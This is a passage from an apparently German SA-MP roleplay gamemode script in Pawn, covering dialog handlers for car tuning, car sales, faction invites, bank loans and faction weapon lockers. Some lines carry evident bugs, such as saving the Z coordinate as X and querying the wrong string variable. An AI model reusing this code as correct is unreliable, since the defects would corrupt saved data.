				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1035);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1053);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1061);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1068);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1091);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING4)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1138);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1147);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1049);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1058);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1162);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1164);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1139);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1146);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1050);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1060);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1158);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1163);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING3)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1028);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1034);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1046);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1064);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1065);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1092);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1029);GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1037);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1045);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1059);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1066);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1089);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_TUNING2)
	{
		if(response)
		{
		    new vehicle = GetPlayerVehicleID(playerid);
		    new veh = GetPlayerVehicleID(playerid);
		    if(listitem == 0)
		    {
		        if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1026);AddVehicleComponent(veh,1027); GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1036);AddVehicleComponent(veh,1040);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1047);AddVehicleComponent(veh,1051);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1056);AddVehicleComponent(veh,1062);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1069);AddVehicleComponent(veh,1071);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1090);AddVehicleComponent(veh,1094);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		    if(listitem == 1)
		    {
      			if(GetVehicleModel(vehicle) == 560){AddVehicleComponent(veh,1030);AddVehicleComponent(veh,1031); GebeGeld(playerid,TUNINGKOSTEN); ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 562){AddVehicleComponent(veh,1039);AddVehicleComponent(veh,1041);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 565){AddVehicleComponent(veh,1048);AddVehicleComponent(veh,1052);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 561){AddVehicleComponent(veh,1057);AddVehicleComponent(veh,1063);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 559){AddVehicleComponent(veh,1070);AddVehicleComponent(veh,1072);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				else if (GetVehicleModel(vehicle) == 558){AddVehicleComponent(veh,1093);AddVehicleComponent(veh,1095);GebeGeld(playerid,TUNINGKOSTEN);ZeigeTuning(playerid);}
				if(mussspeichern[playerid] > 0){Tuningspeichern(playerid,welcherslot[playerid]);}
		    }
		}
		else
		{
		    ZeigeTuning(playerid);
		}
	}
	else if(dialogid == DIALOG_AUTO5)
	{
	    new pID = autovid[playerid],str[300],query[600];
	    if(response)
	    {
            if(SpielerInfo[playerid][uGeld] >= autopreis[playerid])
            {
                new Float:xx,Float:yy,Float:zz,Float:aa;
     			GetVehiclePos(SAuto[pID][idein[pID]][sID],xx,yy,zz);
     			GetVehicleZAngle(SAuto[pID][idein[pID]][sID],aa);
  				SAuto[playerid][autokey[playerid]][sX] = zz;
				SAuto[playerid][autokey[playerid]][sY] = yy;
				SAuto[playerid][autokey[playerid]][sZ] = zz;
				SAuto[playerid][autokey[playerid]][sA] = aa;
				SAuto[playerid][autokey[playerid]][sTank] = SAuto[pID][idein[pID]][sTank];

				SAuto[playerid][autokey[playerid]][sModel] = SAuto[pID][idein[pID]][sModel];
				SAuto[playerid][autokey[playerid]][sPreis] = SAuto[pID][idein[pID]][sPreis];
				format(query,sizeof(query),"INSERT INTO cars (ID,Nummer,Preis,X,Y,Z,A,Model,Kilometer,Kennzeichen,autoneu) VALUES ('%d','%d','%.2f','%.3f','%.3f','%.3f','%.3f','%d','0',' ','1')",
				SpielerInfo[playerid][uID],
				autokey[playerid],
				SAuto[playerid][autokey[playerid]][sPreis],
				SAuto[playerid][autokey[playerid]][sX],
				SAuto[playerid][autokey[playerid]][sY],
				SAuto[playerid][autokey[playerid]][sZ],
				SAuto[playerid][autokey[playerid]][sA],
				SAuto[playerid][autokey[playerid]][sModel]);
				SAuto[playerid][autokey[playerid]][sID] = SAuto[pID][idein[pID]][sID];
				SAuto[pID][idein[pID]][sID] = -1;
				mysql_query(dbhandle, query);
				printf("%s",query);
				format(str,sizeof str,"DELETE FROM autotuning WHERE sID='%d' AND Slot='%d'",SpielerInfo[pID][uID],idein[pID]);
				mysql_query(dbhandle, string);
            	format(str,sizeof str,"DELETE FROM cars WHERE `ID`='%d' AND `Nummer`='%d'",SpielerInfo[pID][uID],idein[pID]);
				mysql_query(dbhandle, str);
				printf("%s",str);
				SendClientMessage(playerid,COLOR_GREEN,"Glückwunsch zu deinem neuem Auto! Nutze /lock um es aufzuschließen oder /parken um es zu parken!");
				SendClientMessage(pID,COLOR_GREEN,"Du hast dein Fahrzeug erfolgreich verkauft!");
				GebeGeld(playerid,-autopreis[playerid]);
				GebeGeld(pID,autopreis[playerid]);
				autovid[playerid] = -1; autovid[pID] = -1; autokey[playerid] = -1; autopreis[pID] = -1; autopreis[playerid] = -1; idein[playerid] = -1;

			}else{SendClientMessage(pID,COLOR_RED,"Du hast nicht genug Geld");SendClientMessage(pID,COLOR_RED,"Der andere Spieler hat den Kauf abgebrochen");autovid[playerid] = -1; autovid[pID] = -1; autokey[playerid] = -1; autopreis[pID] = -1; autopreis[playerid] = -1;}

	    }
	    else
	    {
			SendClientMessage(playerid,COLOR_RED,"Du hast den Kauf abgebrochen!");
			SendClientMessage(pID,COLOR_RED,"Der andere Spieler hat den Kauf abgebrochen");
			autovid[playerid] = -1; autovid[autovid[playerid]] = -1; autokey[playerid] = -1;

	    }
	}

	else if(dialogid == DIALOG_AHAUS)
	{
	    if(response)
	    {
		    for(new h = 0; h < MAX_AAUTOS; h++)
			{
				if(IsPlayerInAnyVehicle(playerid))
				{
	     			if(GetPlayerVehicleID(playerid) == AutoInfo[h][iCreate])
	     			{
	     			
				        new str[200],query[600];
				        //autokey[playerid] = -1;
				        if(SAuto[playerid][0][sID] != -1 && SAuto[playerid][1][sID] != -1){ SendClientMessage(playerid,COLOR_RED,"Du hast bereits zwei Fahrzeuge!"); RemovePlayerFromVehicle(playerid); return 1; }
				        else if(SAuto[playerid][0][sID] == -1)  {autokey[playerid] = 0;}
				        else{autokey[playerid] = 1;}
	        			if(AutoInfo[h][iPreis] > SpielerInfo[playerid][uGeld])
			            {
			                if(AutoInfo[h][iPreis] > SpielerInfo[playerid][uKonto]){SendClientMessage(playerid,COLOR_RED,"Du besitzt nicht genug Geld um dieses Auto zu kaufen!"); RemovePlayerFromVehicle(playerid); return 1;}
			                KontoGeld(playerid,-AutoInfo[h][iPreis],"Auto erworben");
			                SendClientMessage(playerid,COLOR_GREEN,"Das Geld wurde von deinem Konto abgebucht!");
			            }
			            else GebeGeld(playerid,-AutoInfo[h][iPreis]);
				        //KontoGeld(playerid,-AutoInfo[h][iPreis],"Autokauf");
				        SAuto[playerid][autokey[playerid]][sModel] = GetVehicleModel(GetPlayerVehicleID(playerid));
				        new Float:xx,Float:yy,Float:zz,Float:aa;
				        GetVehiclePos(GetPlayerVehicleID(playerid),xx,yy,zz);
				        GetVehicleZAngle(GetPlayerVehicleID(playerid),aa);
			  			SAuto[playerid][autokey[playerid]][sX] = zz;
						SAuto[playerid][autokey[playerid]][sY] = yy;
						SAuto[playerid][autokey[playerid]][sZ] = zz;
						SAuto[playerid][autokey[playerid]][sA] = aa;
				        format(str,sizeof(str),"Glückwunsch zu deinem Kauf! Fahrzeug: %s Preis: %.2f$ Du kannst jetzt den Motor starten! Du findet deine Fahrzeuge unter /autos",AutoDaten[GetVehicleModel(GetPlayerVehicleID(playerid))-399][AutoName],AutoInfo[h][iPreis]);
						SendClientMessage(playerid,COLOR_GREEN,str);
						SendClientMessage(playerid,COLOR_GREEN,"Bitte Parke dein Fahrzeug noch! /parken");
						format(query,sizeof(query),"INSERT INTO cars (ID,Nummer,Preis,X,Y,Z,A,Model,Kilometer,Kennzeichen,abgeschleppt,reperatur,autoneu) VALUES ('%d','%d','%.2f','%.2f','%.2f','%.2f','%.2f','%d','0',' ','0','0','1')",
						SpielerInfo[playerid][uID],
						autokey[playerid],
						AutoInfo[h][iPreis],
						SAuto[playerid][autokey[playerid]][sX],
						SAuto[playerid][autokey[playerid]][sY],
						SAuto[playerid][autokey[playerid]][sZ],
						SAuto[playerid][autokey[playerid]][sA],
						SAuto[playerid][autokey[playerid]][sModel]);
						mysql_query(dbhandle, query);
						printf("%s",string);
						format(query,sizeof(query),"INSERT INTO autotuning (sID,Slot) VALUES ('%d','%d')",
						SpielerInfo[playerid][uID],
						autokey[playerid]);
						mysql_query(dbhandle, query);
						SAuto[playerid][autokey[playerid]][sPreis] = AutoInfo[h][iPreis];
						format(string,sizeof string,"DELETE FROM autohaus WHERE `ID`='%d'",AutoInfo[h][iID]);
						mysql_query(dbhandle, string);
						printf("%s",string);
						SAuto[playerid][autokey[playerid]][sID] = AutoInfo[h][iCreate];
						AutoInfo[h][iCreate] = -1;
						Meter[SAuto[playerid][autokey[playerid]][sID]] = 0;
						new engine, lights, alarm,doors,bonnet,boot,objective;
						GetVehicleParamsEx(SAuto[playerid][autokey[playerid]][sID], engine, lights, alarm, doors, bonnet, boot, objective);
						SetVehicleParamsEx(SAuto[playerid][autokey[playerid]][sID], engine, lights, alarm, VEHICLE_PARAMS_ON, bonnet, boot, objective);
						Benzin[SAuto[playerid][autokey[playerid]][sID]] = AutoDaten[SAuto[playerid][autokey[playerid]][sModel]-399][MaxBenzin];
						SetVehicleNumberPlate(SAuto[playerid][autokey[playerid]][sID]," ");
						format(SAuto[playerid][autokey[playerid]][sKennzeichen],10," ");
	    				Meter[SAuto[playerid][autokey[playerid]][sID]]=0;
						Meter2[SAuto[playerid][autokey[playerid]][sID]]=0;
						SAuto[playerid][autokey[playerid]][sTank] = Benzin[SAuto[playerid][autokey[playerid]][sID]];
						Motorschaden2[SAuto[playerid][autokey[playerid]][sID]] = 0;
						CallLocalFunction("cmd_parken","d",playerid);
						autokey[playerid] = -1;
						if(SpielerInfo[playerid][ufAutokauf] == 0)
				        {
				        	SpielerInfo[playerid][ufAutokauf] = 1;
				        	Missionenaktu(playerid);
				        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Autohaus besuchen {0080FF}(/missionen)");
                            new Float:belohnung;
			            	belohnung = 300;
			            	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
							GebeGeld(playerid,belohnung);
						}
					}
				}
			}
		}
	    else{RemovePlayerFromVehicle(playerid); RemovePlayerFromVehicle(playerid);RemovePlayerFromVehicle(playerid);idein[playerid] = -1;}
	}
	else if(dialogid == Frak_Einladung)
	{
		if(response == 1)
		{
			SpielerInfo[playerid][uMitglied] = Eingeladen[playerid];
			Eingeladen[playerid] = 0;
			format(string,sizeof string,"Du bist der Fraktion %s beigetreten.",Fraktionen[SpielerInfo[playerid][uMitglied]]);
			SendClientMessage(playerid,COLOR_GREEN,string);
			format(string,sizeof string,"%s ist nun neues Mitglied der %s.",PlayerName(playerid),Fraktionen[SpielerInfo[playerid][uMitglied]]);
			FraktionsNachricht(SpielerInfo[playerid][uMitglied], COLOR_LIGHTGREEN, string);
			format(string,sizeof string,"userID='%d'",SpielerInfo[playerid][uID]);
			SpielerInfo[playerid][uRang] = 1;
			new string2[10];
			format(string2,10,"%d",SpielerInfo[playerid][uMitglied]);
			mysqlupdate("user",string,"Mitglied",string2);
			SpielerInfo[playerid][uArbeitslosengeld] = 0;
			format(string,sizeof string,"UPDATE `user` SET Mitglied='%d',Rang='1' WHERE userID='%d'",SpielerInfo[playerid][uMitglied],SpielerInfo[playerid][uID]);
			mysql_query(dbhandle, string);
   			SpielerInfo[playerid][uSpawn] = 4;
   			SendClientMessage(playerid,COLOR_YELLOW,"Dein Spawnort wurde geändert: Fraktionsbase! Ändere dein Spawnort mit /spawns");
		}
		else
		{
		    format(string,sizeof string,"Du hast die Einladung in die Fraktion %s abgelehnt.",Fraktionen[SpielerInfo[playerid][uMitglied]]);
			SendClientMessage(playerid,COLOR_GREEN,string);
			format(string,sizeof string,"%s hat die Einladung abgelehnt.",PlayerName(playerid));
			FraktionsNachricht(Eingeladen[playerid], COLOR_LIGHTGREEN, string);
			Eingeladen[playerid] = 0;
		}
	}
	else if(dialogid == BANK_KREDIT)
	{
	    if(response == 1)
	    {
	        if(SpielerInfo[playerid][uKredit] != 0) return SendClientMessage(playerid,COLOR_RED,"Du hast bereits einen Kredit laufen!");
	        if(floatstr(inputtext) < 10) return SendClientMessage(playerid,COLOR_RED,"Der Kredit muss mindestens 10$ betragen!");
			if(floatstr(inputtext) > 5000) return SendClientMessage(playerid,COLOR_RED,"Der Kredit darf maximal 5000$ betragen!");
			ShowPlayerDialog(playerid,BANK_KREDIT2,DIALOG_STYLE_LIST,"In welchen Raten willst du deinen Kredit zurückzahlen:","6 PayDays\n12 PayDays\n24 PayDays\n36 PayDays","Beantragen","Abbrechen");
			Kreditsumme[playerid] = floatstr(inputtext);
		}
	}//ANFANG WERKZEUGSCHRANK
	else if(dialogid == DIALOG_MLS)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
				case 0:
				{
				    if(SpielerInfo[playerid][uDienst] == 0)
				    {
				        SpielerInfo[playerid][uDienst] = 1;
				        SendClientMessage(playerid,COLOR_GREEN,"Du bist nun im Dienst");
				        SetPlayerColor(playerid,COLOR_MEDIC);
				    }
				    else
					{
				        SpielerInfo[playerid][uDienst] = 0;
				        SendClientMessage(playerid,COLOR_RED,"Du bist nicht mehr im Dienst");
				        SetPlayerColor(playerid,COLOR_OFF);
				    }
         			new dtext[20];
					if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
					else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
		    		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
 					ShowPlayerDialog(playerid,DIALOG_MLS,DIALOG_STYLE_LIST,"Fire & Rescue Department Spind",string,"Auswählen","Abbrechen");
				}
				case 1:
				{
   					ShowPlayerDialog(playerid,DIALOG_MLS1,DIALOG_STYLE_LIST,"Fire & Rescue Department Spind","Mechaniker 1\nMechaniker 2\nMechaniker 3\nSanitäter 1\nSanitäter 2\nSanitäter 3\nDoktor\nFeuerwehr 1\nFeuerwehr 2\nFeuerwehr 3\nZivil\nSanitäter 4\nSanitäter 5","Auswählen","Zurück");
				}
				case 2:
				{
				    ShowPlayerDialog(playerid,DIALOG_MLS3,DIALOG_STYLE_LIST,"Fire & Rescue Department Spind","Messer\nKamera\nMotorsäge\nFeuerlöscher\nSpray\nMedikamente","Auswählen","Zurück");
				}
	        }
	    }
	}
	else if(dialogid == DIALOG_MLS1)
	{
	    if(response)
	    {
	        new skin;
	        if(listitem == 0){skin = 42;}
	        if(listitem == 1){skin = 50;}
	        if(listitem == 2){skin = 71;}
	        if(listitem == 3){skin = 274;}
	        if(listitem == 4){skin = 275;}
	        if(listitem == 5){skin = 276;}
	        if(listitem == 6){skin = 70;}
	        if(listitem == 7){skin = 277;}
	        if(listitem == 8){skin = 278;}
	        if(listitem == 9){skin = 279;}
	        if(listitem == 10){skin = 188;}
	        if(listitem == 11){skin = 25006;}
	        if(listitem == 12){skin = 25007;}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			SendClientMessage(playerid,COLOR_GREEN,"Skin ausgewählt");
			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
			format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_MLS,DIALOG_STYLE_LIST,"Fire & Rescue Department Spind",string,"Auswählen","Abbrechen");
	    }
	    else
		{
			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
			format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_MLS,DIALOG_STYLE_LIST,"Fire & Rescue Department Spind",string,"Auswählen","Abbrechen");
		}
	}
	else if(dialogid == DIALOG_MLS3)
	{
	    if(response)
	    {
	     	new Float:money,waffe,ammo,weaponn[30],str[150];
	     	if(listitem == 0){ money = 3.0; waffe = 4; ammo = 1; weaponn = "Messer 3$";}
			if(listitem == 1){ money = 5.0; waffe = 43; ammo = 20;weaponn = "Kamera 5$";}
			if(listitem == 2){ money = 20.0; waffe = 9; ammo = 10;weaponn = "Motorsäge 20$";}
			if(listitem == 3){ money = 20.0; waffe = 42; ammo = 3000;weaponn = "Feuerlöscher 20$";}
			if(listitem == 4){ money = 15.0; waffe = 41; ammo = 800;weaponn = "Spray 15$";}
			if(listitem == 5) { money = 5.0; weaponn = "Medikamente 5$"; Medikamente[playerid] = 10; SendClientMessage(playerid,COLOR_YELLOW," Du hast dir 10 Medikamente genommen");}
			GebeWaffe(playerid,waffe,ammo);
			if(IstSpielerInFrak(playerid,3))
			{
			    Fraktionskasse[3] -= money;
			    Frakkassespeichern(3);
				new name[MAX_PLAYER_NAME];
				GetPlayerName(playerid,name,sizeof(name));
				format(str,sizeof(str),"%s hat sich eine Waffe genommen. Waffe: %s",name,weaponn);
				FraktionsNachricht(3, 0xFF8C00FF, str);
				ShowPlayerDialog(playerid,DIALOG_MLS3,DIALOG_STYLE_LIST,"Fire & Rescue Department Spind","Messer\nKamera\nMotorsäge\nFeuerlöscher\nSpray\nMedikamente","Auswählen","Zurück");
			}
			else if(IstSpielerInFrak(playerid,4))
			{
			    Fraktionskasse[4] -= money;
			    Frakkassespeichern(4);
				new name[MAX_PLAYER_NAME];
				GetPlayerName(playerid,name,sizeof(name));
				format(str,sizeof(str),"%s hat sich eine Waffe genommen. Waffe: %s",name,weaponn);
				FraktionsNachricht(4, 0xFF8C00FF, str);
				ShowPlayerDialog(playerid,DIALOG_MLS3,DIALOG_STYLE_LIST,"Fire & Rescue Department Spind","Messer\nKamera\nMotorsäge\nFeuerlöscher\nSpray\nMedikamente","Auswählen","Zurück");
			}
		 }
	    else
		{
			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
			format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_MLS,DIALOG_STYLE_LIST,"Fire & Rescue Department Department Spind",string,"Auswählen","Abbrechen");
		}
	}
	else if(dialogid == DIALOG_ARMY1)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
				case 0:
				{
				    if(SpielerInfo[playerid][uDienst] == 0)
				    {
				        SpielerInfo[playerid][uDienst] = 1;
				        SendClientMessage(playerid,COLOR_GREEN,"Du bist nun im Dienst");
				        SetPlayerColor(playerid,COLOR_ARMY);
				    }
				    else
					{
				        SpielerInfo[playerid][uDienst] = 0;
				        SendClientMessage(playerid,COLOR_RED,"Du bist nicht mehr im Dienst");
				        SetPlayerColor(playerid,COLOR_OFF);
				    }
         			new dtext[20];
					if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
					else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
		    		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
 					ShowPlayerDialog(playerid,DIALOG_ARMY1,DIALOG_STYLE_LIST,"U.S. Army Spind",string,"Auswählen","Abbrechen");
				}
				case 1:
				{
					ShowPlayerDialog(playerid,DIALOG_ARMY2,DIALOG_STYLE_LIST,"U.S. Army Spind","Skin 1\nSkin 2\nSkin 3\nSkin 4\nSkin 5\nSkin 6\nSkin 7","Auswählen","Zurück");
				}
				case 2:
				{
				    ShowPlayerDialog(playerid,DIALOG_ARMY3,DIALOG_STYLE_LIST,"U.S. Army Spind","Schlagstock\nMesser\nTränengas\nDesert Deagle\n9mm\nShotgun\nMP5\nM4\nSniper Rifle\nSchutzweste","Auswählen","Zurück");
				}
	        }
	    }
	}
	else if(dialogid == DIALOG_ARMY3)
	{
	    if(response)
	    {
	     	new Float:money,waffe,ammo,weaponn[20],str[150];
	     	if(listitem == 0){ money = 0.50; waffe = 3; ammo = 1; 	weaponn = "Schlagstock 0.50$";}
			if(listitem == 1){ money = 3.0; waffe = 4; ammo = 1;		weaponn = "Messer 3$";}
			if(listitem == 2){ money = 5.0; waffe = 17; ammo = 5;		weaponn = "Tränengas 5$";}
			if(listitem == 3){ money = 10.0; waffe = 24; ammo = 50;	weaponn = "Desert Deagle 10$";}
			if(listitem == 4){ money = 8.0; waffe = 23; ammo = 50;	weaponn = "9mm 8$";}
			if(listitem == 5){ money = 3.0; waffe = 25; ammo = 10;	weaponn = "Shotgun 3$";}
			if(listitem == 6){ money = 12.0; waffe = 29; ammo = 100;	weaponn = "MP5 12$";}
			if(listitem == 7){ money = 20.0; waffe = 31; ammo = 100;	weaponn = "M4 20$";}
			if(listitem == 8){ money = 15.0; waffe = 34; ammo = 15;	weaponn = "Sniper Rifle 15$";}
			if(listitem == 9){ money = 20; waffe = 0; ammo = 0; GebeRuestung(playerid,99);	weaponn = "Schutzweste 20$";}
			GebeWaffe(playerid,waffe,ammo);
		    Fraktionskasse[15] -= money;
		    Frakkassespeichern(15);
			new name[MAX_PLAYER_NAME];
			GetPlayerName(playerid,name,sizeof(name));
			format(str,sizeof(str),"%s hat sich eine Waffe genommen. Waffe: %s",name,weaponn);
			FraktionsNachricht(15, 0xFF8C00FF, str);
			ShowPlayerDialog(playerid,DIALOG_ARMY3,DIALOG_STYLE_LIST,"U.S. Army Spind","Schlagstock\nMesser\nTränengas\nDesert Deagle\n9mm\nShotgun\nMP5\nM4\nSniper Rifle\nSchutzweste","Auswählen","Zurück");
		 }
	    else
		{
 			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
    		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_ARMY1,DIALOG_STYLE_LIST,"U.S. Army Spind",string,"Auswählen","Abbrechen");
		}
	}
	else if(dialogid == DIALOG_ARMY2)
	{
	    if(response)
	    {
	        new skin;
	        if(listitem == 0){skin = 16;}
	        if(listitem == 1){skin = 121;}
	        if(listitem == 2){skin = 179;}
	        if(listitem == 3){skin = 191;}
	        if(listitem == 4){skin = 287;}
	        if(listitem == 5){skin = 25001;}
	        if(listitem == 6){skin = 25003;}
			SetPlayerSkin(playerid,skin);
			SpielerInfo[playerid][uSkin] = skin;
			SpielerInfo[playerid][uZiviFrak] = 1;
			SendClientMessage(playerid,COLOR_GREEN,"Skin ausgewählt");
 			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
    		format(string,sizeof(string),"{FEFEFE}Dienst: %s\n{FEFEFE}Uniform auswählen\nAusrüsten",dtext);
			ShowPlayerDialog(playerid,DIALOG_ARMY1,DIALOG_STYLE_LIST,"U.S. Army Spind",string,"Auswählen","Abbrechen");
	    }
	    else
		{
 			new dtext[20];
			if(SpielerInfo[playerid][uDienst] == 0) { dtext = "{C30000}Nein"; }
			else if(SpielerInfo[playerid][uDienst] == 1) { dtext = "{00A91E}Ja"; }
